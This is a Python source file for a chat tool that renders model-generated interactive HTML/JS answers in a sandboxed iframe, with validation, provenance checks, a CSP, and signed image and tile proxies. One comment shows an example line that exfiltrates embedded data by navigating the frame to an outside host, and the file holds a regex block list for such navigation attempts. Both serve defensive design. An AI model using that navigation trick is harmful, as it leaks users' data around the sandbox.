"""
interactive_ui.py — the `render_ui` tool: interactive answers inline in the chat.

The model can answer with a small sandboxed web app instead of prose: a chart
with a slider, a calculator, a comparison with adjustable weights, a process
diagram. It sends the pieces — css, html, js, optional embedded data — and the
frontend renders them in an iframe right in the message list (see
`web/src/components/interactive/InlineUi.tsx` and the `/api/ui-shell` route).

Nothing here knows a use case. The tool is a primitive; what to build and how
is the model's call, steered by the prompt section in `agent_loop.TOOL_SECTIONS`
and by skills (`system_skills/`, loaded by src/system_skills.py). A new kind of interactive
answer is a new skill, never a code change here.

The tool answers twice, like every widget tool (src/widgets.py):
  - the model gets a one-line confirmation plus a compact summary (title,
    sources, data keys). That summary is also what later turns see through the
    history replay, so "make that a bar chart" works without re-sending tens of
    kilobytes of markup into the context.
  - the user gets a `ui` widget carrying the full payload.

Provenance is mandatory. Every call names where its numbers come from
(`sources`), and the HOST shows that list under the frame — not the generated
HTML, which could claim anything. A call without sources is rejected, so the
model hears about it as an error it can fix in the same turn.
"""

import json
import logging
import re
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# The order the model should emit the fields in. Styles first means a streaming
# renderer can show a styled skeleton while the markup is still arriving, and
# script last means nothing runs against half a document. M1 renders only the
# finished call, but the schema already asks for this order so streaming (M2)
# needs no prompt change.
FIELD_ORDER = (
    "title",
    "initialHeight",
    "placeholderMessages",
    "css",
    "html",
    "js",
    "jsInit",
    "data",
    "sources",
    "libraries",
)

# `model` is the model's own general knowledge (well-known facts, typical
# values) — legitimate, but the user should see it is not from a lookup.
SOURCE_KINDS = ("user", "sql", "knowledge", "web", "model", "calculated", "illustrative")

# Bounds. The whole payload must fit the `ui` widget cap in src/widgets.py with
# room for the envelope; checking here turns an oversized UI into a tool error
# the model can act on (move data into a smaller aggregate, drop a library)
# instead of a widget that silently never appears.
MAX_CODE_BYTES = 256_000  # css + html + js + jsInit together
MAX_DATA_BYTES = 200_000
MAX_TITLE_CHARS = 120
MAX_PLACEHOLDERS = 6
MAX_PLACEHOLDER_CHARS = 120
MAX_INIT_STEPS = 20
MAX_INIT_CHARS = 2_000
MAX_SOURCES = 30
MAX_SOURCE_LABEL_CHARS = 200
MAX_SOURCE_REF_CHARS = 1_000
MIN_HEIGHT = 50
MAX_HEIGHT = 4_000
DEFAULT_HEIGHT = 360


class RenderUiError(ValueError):
    """A call the model has to fix. The message is written for the model."""


def enabled() -> bool:
    """Admin switch for the whole feature (Settings → interactive answers)."""
    try:
        from src.settings import get_setting

        return bool(get_setting("interactive_answers_enabled", False))
    except Exception:
        return False


# Libraries served from static/ui-vendor/ (scripts/vendor_ui_libs.py). The
# frontend maps these names to script tags (LIBRARIES in web/src/lib/uiFrame.ts)
# and also detects them from the code, so `libraries` is a hint, not a must.
LIBRARIES = ("echarts", "d3", "chartjs", "three", "leaflet", "mermaid")
VENDOR_PATH = "/static/ui-vendor/"

DEFAULT_TILE_URL = "https://tile.openstreetmap.org/{z}/{x}/{y}.png"
DEFAULT_TILE_ATTRIBUTION = (
    '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>-Mitwirkende'
    ' · <a href="https://www.openstreetmap.org/fixthemap">Kartenfehler melden</a>'
)


TILE_PROXY_PATH = "/api/ui/tiles/{z}/{x}/{y}.png"


def map_config() -> Dict[str, Any]:
    """Map tiles for interactive answers. OpenStreetMap by default.

    The browser never talks to the tile server: frames load tiles from this
    instance (TILE_PROXY_PATH), which fetches and caches them under the tile
    server's usage policy (src/tile_proxy.py). `upstream` is the real template
    and stays on the server; `public()` is what the frame gets."""
    try:
        from src.settings import get_setting

        enabled_ = bool(get_setting("ui_maps_enabled", True))
        url = str(get_setting("ui_map_tile_url", DEFAULT_TILE_URL) or "").strip()
        attribution = str(get_setting("ui_map_attribution", "") or "").strip()
        max_zoom = int(get_setting("ui_map_max_zoom", 19) or 19)
    except Exception:
        enabled_, url, attribution, max_zoom = True, DEFAULT_TILE_URL, "", 19
    if not url.startswith("https://") or "{z}" not in url:
        enabled_ = False
    if not attribution and url == DEFAULT_TILE_URL:
        attribution = DEFAULT_TILE_ATTRIBUTION
    return {
        "enabled": enabled_,
        "tileUrl": TILE_PROXY_PATH if enabled_ else "",
        "upstream": url if enabled_ else "",
        "attribution": attribution,
        "osm": url == DEFAULT_TILE_URL,
        "maxZoom": max(1, min(max_zoom, 19 if url == DEFAULT_TILE_URL else 22)),
    }


def public_map_config() -> Dict[str, Any]:
    """map_config without the server-side tile server URL."""
    return {k: v for k, v in map_config().items() if k != "upstream"}


def ui_shell_csp() -> str:
    """CSP of the frame.

    Libraries are admitted by 'self', not by host name: behind a reverse proxy
    the Host this process sees is not necessarily the one the browser used, and
    a host-based source would then block the instance's own files. In a
    sandboxed (opaque-origin) document 'self' still means the origin of the
    document's URL, i.e. this instance.
    """
    # Map tiles come from this instance too (the tile proxy), so images need
    # no outside host at all.
    vendor = "'self'"
    return (
        "default-src 'none'; "
        # blob: — the libraries arrive embedded in the document and are run
        # from blob URLs the frame creates itself (web/src/lib/uiFrame.ts).
        f"script-src 'unsafe-inline' 'unsafe-eval' blob: {vendor}; "
        f"style-src 'unsafe-inline' {vendor}; "
        f"img-src data: blob: {vendor}; "
        "font-src data:; "
        "connect-src 'none'; "
        "form-action 'none'; "
        "base-uri 'none'"
    )


def _text(value: Any, field: str, limit: Optional[int] = None) -> str:
    if value is None:
        return ""
    if not isinstance(value, str):
        raise RenderUiError(f"`{field}` must be a string.")
    if limit is not None and len(value) > limit:
        raise RenderUiError(f"`{field}` is too long (max {limit} characters).")
    return value


def _string_list(value: Any, field: str, max_items: int, max_chars: int) -> List[str]:
    if value is None:
        return []
    if isinstance(value, str):
        value = [value]
    if not isinstance(value, list):
        raise RenderUiError(f"`{field}` must be a list of strings.")
    out = []
    for item in value[:max_items]:
        if not isinstance(item, str):
            raise RenderUiError(f"`{field}` must be a list of strings.")
        item = item.strip()
        if not item:
            continue
        if len(item) > max_chars:
            raise RenderUiError(f"Each entry in `{field}` must be at most {max_chars} characters.")
        out.append(item)
    if len(value) > max_items:
        raise RenderUiError(f"`{field}` takes at most {max_items} entries.")
    return out


def _height(value: Any) -> int:
    if value is None or value == "":
        return DEFAULT_HEIGHT
    try:
        h = int(float(value))
    except (TypeError, ValueError):
        return DEFAULT_HEIGHT
    return max(MIN_HEIGHT, min(MAX_HEIGHT, h))


def _sources(value: Any) -> List[Dict[str, str]]:
    if isinstance(value, dict):
        value = [value]
    if not isinstance(value, list) or not value:
        raise RenderUiError(
            "`sources` is required: list where the shown data comes from, e.g. "
            '[{"kind": "sql", "label": "Umsatz je Monat aus dbo.orders"}]. '
            f"kind is one of {', '.join(SOURCE_KINDS)}. Use 'model' for facts from your "
            "own general knowledge, 'illustrative' for "
            "example values and 'calculated' for numbers you derived."
        )
    if len(value) > MAX_SOURCES:
        raise RenderUiError(f"`sources` takes at most {MAX_SOURCES} entries.")
    out = []
    for item in value:
        if not isinstance(item, dict):
            raise RenderUiError(
                "Each entry in `sources` must be an object with `kind` and `label`."
            )
        kind = str(item.get("kind") or "").strip().lower()
        if kind not in SOURCE_KINDS:
            raise RenderUiError(
                f"Unknown source kind {kind!r}; use one of {', '.join(SOURCE_KINDS)}."
            )
        label = str(item.get("label") or "").strip()
        if not label:
            raise RenderUiError("Each source needs a `label` saying what it is.")
        entry = {"kind": kind, "label": label[:MAX_SOURCE_LABEL_CHARS]}
        ref = item.get("ref")
        if ref is not None and str(ref).strip():
            entry["ref"] = str(ref).strip()[:MAX_SOURCE_REF_CHARS]
        out.append(entry)
    return out


def _data(value: Any) -> Any:
    if value is None:
        return None
    if isinstance(value, str):
        # Models frequently send embedded data as a JSON string rather than as
        # a value. Accept both; anything that is not JSON is passed as a string.
        stripped = value.strip()
        if stripped[:1] in "{[":
            try:
                value = json.loads(stripped)
            except (json.JSONDecodeError, ValueError):
                pass
    try:
        encoded = json.dumps(value, allow_nan=False, ensure_ascii=False)
    except (TypeError, ValueError):
        raise RenderUiError("`data` must be plain JSON (no NaN/Infinity).")
    if len(encoded.encode("utf-8")) > MAX_DATA_BYTES:
        raise RenderUiError(
            f"`data` is too large (max {MAX_DATA_BYTES // 1000} KB). Aggregate it first "
            "(GROUP BY in SQL, fewer points, rounded values) and embed the result."
        )
    return value


def normalize(args: Dict[str, Any]) -> Dict[str, Any]:
    """Validate a render_ui call and return the widget payload. Raises
    RenderUiError with a message meant for the model."""
    if not isinstance(args, dict):
        raise RenderUiError("render_ui takes a JSON object.")

    title = _text(args.get("title"), "title").strip()[:MAX_TITLE_CHARS]
    css = _text(args.get("css"), "css")
    html = _text(args.get("html"), "html")
    # `jsFunctions` is OpenIntelligentUI's name for the same field; models that
    # have seen it reach for it.
    js = _text(args.get("js", args.get("jsFunctions")), "js")
    js_init = _string_list(
        args.get("jsInit", args.get("jsExpressions")), "jsInit", MAX_INIT_STEPS, MAX_INIT_CHARS
    )

    if not html.strip():
        raise RenderUiError(
            "`html` is empty. Send the markup of the interactive answer (a fragment, "
            "no <html>/<head>/<body>); put styles in `css` and script in `js`."
        )

    navigation = _navigation_attempt("\n".join((html, js, *js_init)))
    if navigation:
        raise RenderUiError(
            f"The UI may not navigate ({navigation}). It stays in the chat; to open a page "
            "on the user's click use window.talos.openLink(url) with a URL written in the UI."
        )

    code_bytes = sum(len(part.encode("utf-8")) for part in (css, html, js, *js_init))
    if code_bytes > MAX_CODE_BYTES:
        raise RenderUiError(
            f"The UI is too large ({code_bytes // 1000} KB of css/html/js, max "
            f"{MAX_CODE_BYTES // 1000} KB). Keep the markup lean and generate repeated "
            "elements from `data` in `js` instead of writing them out."
        )

    payload: Dict[str, Any] = {
        "title": title,
        "initialHeight": _height(args.get("initialHeight")),
        "placeholderMessages": _string_list(
            args.get("placeholderMessages"),
            "placeholderMessages",
            MAX_PLACEHOLDERS,
            MAX_PLACEHOLDER_CHARS,
        ),
        "css": css,
        "html": html,
        "js": js,
        "jsInit": js_init,
        "sources": _sources(args.get("sources")),
    }
    data = _data(args.get("data"))
    if data is not None:
        payload["data"] = data
    libraries = _libraries(args.get("libraries"))
    if libraries:
        payload["libraries"] = libraries
    from src.ui_data import DataSourceError, normalize_sources

    try:
        specs = normalize_sources(args.get("dataSources"))
    except DataSourceError as e:
        raise RenderUiError(str(e))
    if specs:
        # Kept under a private key: the stored spec (SQL, URL) is registered by
        # do_render_ui and only its public part goes to the frame.
        payload["_dataSourceSpecs"] = specs
    return payload


# ── Images ──
# The frame may not load images from the internet (img-src is local + tiles):
# a third-party image would leak the user's IP and the topic of their chat to
# whoever hosts it. Image URLs the model puts into an answer are rewritten at
# render time to this instance's proxy, each with a signature — the proxy only
# serves URLs that were signed, so it cannot be used as an open proxy, and the
# frame (which has no cookies) can still load them.
IMAGE_PROXY_PATH = "/api/ui/img"
_IMG_URL_RE = re.compile(
    r"https://[^\s\"'<>()\\]+?\.(?:png|jpe?g|gif|webp|avif)(?:\?[^\s\"'<>()\\]*)?", re.I
)
_IMG_SRC_RE = re.compile(r"""(<img\b[^>]*?\bsrc\s*=\s*)(["'])(https://[^"']+)\2""", re.I)
MAX_IMAGES = 60


def _image_key() -> bytes:
    from src.secret_storage import derive_key

    return derive_key("ui-image-proxy")


def sign_image_url(url: str) -> str:
    import hashlib
    import hmac
    from urllib.parse import quote

    sig = hmac.new(_image_key(), url.encode("utf-8"), hashlib.sha256).hexdigest()[:32]
    return f"{IMAGE_PROXY_PATH}?u={quote(url, safe='')}&s={sig}"


def image_signature_ok(url: str, sig: str) -> bool:
    import hashlib
    import hmac

    expected = hmac.new(_image_key(), url.encode("utf-8"), hashlib.sha256).hexdigest()[:32]
    return hmac.compare_digest(expected, sig or "")


def proxy_images(payload: Dict[str, Any]) -> None:
    """Rewrite <img src="https://…"> in the markup and collect image URLs found
    in markup, script and data into `images` (original → proxied), which the
    frame exposes as talos.img(url)."""
    found: Dict[str, str] = {}

    def add(url: str) -> Optional[str]:
        if url in found:
            return found[url]
        if len(found) >= MAX_IMAGES or len(url) > 2000:
            return None
        found[url] = sign_image_url(url)
        return found[url]

    def rewrite(m: "re.Match[str]") -> str:
        proxied = add(m.group(3))
        return (
            f"{m.group(1)}{m.group(2)}{proxied or m.group(3)}{m.group(2)}"
            if proxied
            else m.group(0)
        )

    payload["html"] = _IMG_SRC_RE.sub(rewrite, payload["html"])
    blob = payload["html"] + payload["js"] + json.dumps(payload.get("data"), ensure_ascii=False)
    for url in _IMG_URL_RE.findall(blob):
        add(url)
    if found:
        payload["images"] = found


# A sandboxed frame can still navigate ITSELF, and neither the sandbox nor the
# CSP stops that: `location.href = "https://x/?d=" + data` would carry the
# embedded data (SQL rows, refreshed results) to any host — around the
# connect-src block and the web leak guard. The frame has no legitimate reason
# to navigate (links go through talos.openLink), so code that tries is refused
# at render time. A pattern check, not a sandbox: it stops the plain forms a
# model writes; the host additionally refuses links it did not see written.
_NAVIGATION_PATTERNS = (
    (re.compile(r"<meta[^>]+http-equiv\s*=\s*[\"']?\s*refresh", re.I), "meta refresh"),
    (
        re.compile(
            r"\blocation\s*(?:=(?!=)|\[|\.\s*(?:href|pathname|search|host|hostname|protocol|port)\s*=(?!=)"
            r"|\.\s*(?:assign|replace|reload)\s*\()"
        ),
        "location",
    ),
    (re.compile(r"\bwindow\s*\.\s*open\s*\(|(?<![\w.$])open\s*\("), "window.open"),
    (re.compile(r"\b(?:top|parent)\s*\.\s*location\b"), "top/parent location"),
    (re.compile(r"\bnavigation\s*\.\s*navigate\s*\("), "navigation.navigate"),
)


def _navigation_attempt(code: str) -> Optional[str]:
    for pattern, label in _NAVIGATION_PATTERNS:
        if pattern.search(code):
            return label
    return None


def _libraries(value: Any) -> List[str]:
    if value is None or value == "":
        return []
    if isinstance(value, str):
        value = [value]
    if not isinstance(value, list):
        raise RenderUiError("`libraries` must be a list of names.")
    out: List[str] = []
    for item in value:
        name = str(item or "").strip().lower().replace(".", "").replace("-", "")
        name = {"chart": "chartjs", "threejs": "three"}.get(name, name)
        if name not in LIBRARIES:
            raise RenderUiError(
                f"Unknown library {item!r}. Available (served locally, no CDN): "
                f"{', '.join(LIBRARIES)}. For simple charts use talos.chart instead."
            )
        if name not in out:
            out.append(name)
    return out


def _data_shape(data: Any) -> str:
    """A few words on what `data` holds, for the model's follow-up turns."""
    if isinstance(data, dict):
        keys = list(data.keys())
        shown = ", ".join(str(k) for k in keys[:12])
        more = f" (+{len(keys) - 12})" if len(keys) > 12 else ""
        return f"object with keys {shown}{more}"
    if isinstance(data, list):
        return f"list of {len(data)} items"
    return type(data).__name__


def summary(payload: Dict[str, Any]) -> str:
    """What the model reads back — now and on every later turn via the history
    replay. Enough to talk about and rebuild the UI, nowhere near its size."""
    title = payload.get("title") or "untitled"
    lines = [
        f"Interactive answer rendered inline for the user: {title!r}. "
        "It is already visible — do not rebuild it or repeat its contents as a table; "
        "add only what the UI does not show."
    ]
    src = "; ".join(f"{s['kind']}: {s['label']}" for s in payload.get("sources") or [])
    if src:
        lines.append(f"Sources shown under it: {src}")
    if "data" in payload:
        lines.append(f"Embedded data: {_data_shape(payload['data'])}")
    controls = _controls(payload.get("html") or "")
    if controls:
        lines.append(f"Controls: {controls}")
    if payload.get("dataSources"):
        live = ", ".join(f"{s['id']} ({s['kind']})" for s in payload["dataSources"])
        lines.append(f"Live data sources the UI can refresh: {live}")
    lines.append("To change it in a later turn, call render_ui again with the full new version.")
    return "\n".join(lines)


def _controls(html: str) -> str:
    """Count the interactive elements, so a follow-up turn knows what the user
    could have been adjusting ("set the slider to 40%")."""

    counts = []
    for name, pattern in (
        ("slider", r"<input[^>]*type=[\"']?range"),
        ("input", r"<input(?![^>]*type=[\"']?(?:range|button|submit|hidden))"),
        ("select", r"<select\b"),
        ("button", r"<button\b"),
    ):
        n = len(re.findall(pattern, html, flags=re.IGNORECASE))
        if n:
            counts.append(f"{n} {name}{'s' if n > 1 else ''}")
    return ", ".join(counts)


def parse_args(content: str) -> Dict[str, Any]:
    """The tool's content is the JSON object, from a native call or a
    ```render_ui fence. Tolerates a fence body wrapped in a further ```json."""
    text = (content or "").strip()
    if text.startswith("```"):
        text = text.split("\n", 1)[1] if "\n" in text else ""
        if text.rstrip().endswith("```"):
            text = text.rstrip()[:-3]
    if not text:
        raise RenderUiError("render_ui needs a JSON object with at least `html` and `sources`.")
    try:
        args = json.loads(text)
    except (json.JSONDecodeError, ValueError) as e:
        raise RenderUiError(
            f"render_ui content is not valid JSON ({e}). Send one JSON object; escape "
            "quotes and newlines inside the css/html/js strings."
        )
    if not isinstance(args, dict):
        raise RenderUiError("render_ui takes a JSON object.")
    return args


def display_title(content: str) -> str:
    """Short label for the tool row and the history record — never the payload."""
    try:
        args = json.loads(content)
        if isinstance(args, dict) and isinstance(args.get("title"), str):
            return args["title"].strip()[:MAX_TITLE_CHARS] or "render_ui"
    except (json.JSONDecodeError, ValueError, TypeError):
        pass
    return "render_ui"


async def do_render_ui(
    content: str, owner: Optional[str] = None, session_id: Optional[str] = None
) -> Dict[str, Any]:
    from src.widgets import make_widget

    try:
        payload = normalize(parse_args(content))
    except RenderUiError as e:
        return {"error": f"render_ui: {e}", "exit_code": 1}
    specs = payload.pop("_dataSourceSpecs", None)
    if specs:
        from src.ui_data import public_spec, register

        try:
            payload["uiId"] = register(specs, owner, session_id)
        except Exception:
            logger.exception("render_ui: storing data sources failed")
            return {"error": "render_ui: the data sources could not be stored.", "exit_code": 1}
        payload["dataSources"] = [public_spec(s) for s in specs]
    proxy_images(payload)
    return {
        "output": summary(payload),
        "exit_code": 0,
        "widget": make_widget("ui", payload),
    }


# ── Streaming ──────────────────────────────────────────────────────────────
# While the model is still writing a render_ui call, the frontend can already
# show a styled skeleton and the markup as it grows (M2 of the plan). The
# arguments arrive as a JSON object cut at an arbitrary byte, so this reads the
# top-level fields of a PREFIX of that object: string fields as far as they go,
# everything else once it is complete.

# Fields streamed as they grow. Others (numbers, lists, data) are sent whole.
STREAMED_FIELDS = ("title", "css", "html", "js")
# Fields the preview needs before the call is done. data/sources/jsInit are only
# used by the final render, which gets them from the tool result.
PREVIEW_FIELDS = ("title", "initialHeight", "placeholderMessages", "css", "html", "libraries")


def _decode_partial_string(raw: str) -> str:
    """Decode the body of a JSON string that may be cut mid-escape."""
    for cut in (0, 1, 2, 3, 4, 5):
        candidate = raw[: len(raw) - cut] if cut else raw
        if candidate.endswith("\\") and not candidate.endswith("\\\\"):
            continue
        try:
            return json.loads('"' + candidate + '"')
        except (json.JSONDecodeError, ValueError):
            continue
    return ""


def parse_partial_object(text: str) -> Dict[str, Any]:
    """Top-level fields of a possibly truncated JSON object.

    Returns {field: (value, complete)}. A string field that is still being
    written comes back decoded as far as it goes; a non-string value appears
    only once it is complete. Never raises — malformed input yields what could
    be read before the problem.
    """
    out: Dict[str, Any] = {}
    i, n = 0, len(text)

    def skip_ws(j: int) -> int:
        while j < n and text[j] in " \t\r\n,":
            j += 1
        return j

    def scan_string(j: int):
        """j points at the opening quote. Returns (end_index_after_quote|None, raw_body)."""
        k = j + 1
        while k < n:
            c = text[k]
            if c == "\\":
                k += 2
                continue
            if c == '"':
                return k + 1, text[j + 1 : k]
            k += 1
        return None, text[j + 1 :]

    i = skip_ws(i)
    if i >= n or text[i] != "{":
        return out
    i += 1
    while True:
        i = skip_ws(i)
        if i >= n or text[i] == "}":
            return out
        if text[i] != '"':
            return out
        end, raw_key = scan_string(i)
        if end is None:
            return out
        key = _decode_partial_string(raw_key)
        i = end
        while i < n and text[i] in " \t\r\n":
            i += 1
        if i >= n or text[i] != ":":
            return out
        i += 1
        while i < n and text[i] in " \t\r\n":
            i += 1
        if i >= n:
            return out
        if text[i] == '"':
            end, raw = scan_string(i)
            out[key] = (_decode_partial_string(raw), end is not None)
            if end is None:
                return out
            i = end
            continue
        if text[i] in "{[":
            depth, k, in_str = 0, i, False
            while k < n:
                c = text[k]
                if in_str:
                    if c == "\\":
                        k += 2
                        continue
                    if c == '"':
                        in_str = False
                elif c == '"':
                    in_str = True
                elif c in "{[":
                    depth += 1
                elif c in "}]":
                    depth -= 1
                    if depth == 0:
                        break
                k += 1
            if k >= n:
                return out
            try:
                out[key] = (json.loads(text[i : k + 1]), True)
            except (json.JSONDecodeError, ValueError):
                return out
            i = k + 1
            continue
        k = i
        while k < n and text[k] not in ",}":
            k += 1
        if k >= n:
            return out
        try:
            out[key] = (json.loads(text[i:k].strip()), True)
        except (json.JSONDecodeError, ValueError):
            pass
        i = k


class UiStream:
    """Turns the growing arguments of ONE render_ui call into SSE events.

    `feed(full_args_so_far)` returns the events to send: one `ui_stream_open`
    first, then `ui_stream_delta` frames — `append` for the streamed string
    fields (only the new characters, so a 30 KB html costs 30 KB on the wire,
    not 30 KB per token), `value` for the rest — each with `complete`."""

    def __init__(self, stream_id: str):
        self.id = stream_id
        self.opened = False
        self.sent: Dict[str, int] = {}
        self.done: set = set()

    def feed(self, text: str) -> List[Dict[str, Any]]:
        fields = parse_partial_object(text)
        events: List[Dict[str, Any]] = []
        if not self.opened:
            self.opened = True
            events.append({"type": "ui_stream_open", "id": self.id})
        for name in PREVIEW_FIELDS:
            if name not in fields or name in self.done:
                continue
            value, complete = fields[name]
            if name in STREAMED_FIELDS and isinstance(value, str):
                sent = self.sent.get(name, 0)
                if len(value) > sent or (complete and name not in self.done):
                    events.append(
                        {
                            "type": "ui_stream_delta",
                            "id": self.id,
                            "field": name,
                            "append": value[sent:],
                            "complete": bool(complete),
                        }
                    )
                    self.sent[name] = len(value)
            elif complete:
                events.append(
                    {
                        "type": "ui_stream_delta",
                        "id": self.id,
                        "field": name,
                        "value": value,
                        "complete": True,
                    }
                )
            if complete:
                self.done.add(name)
        return events
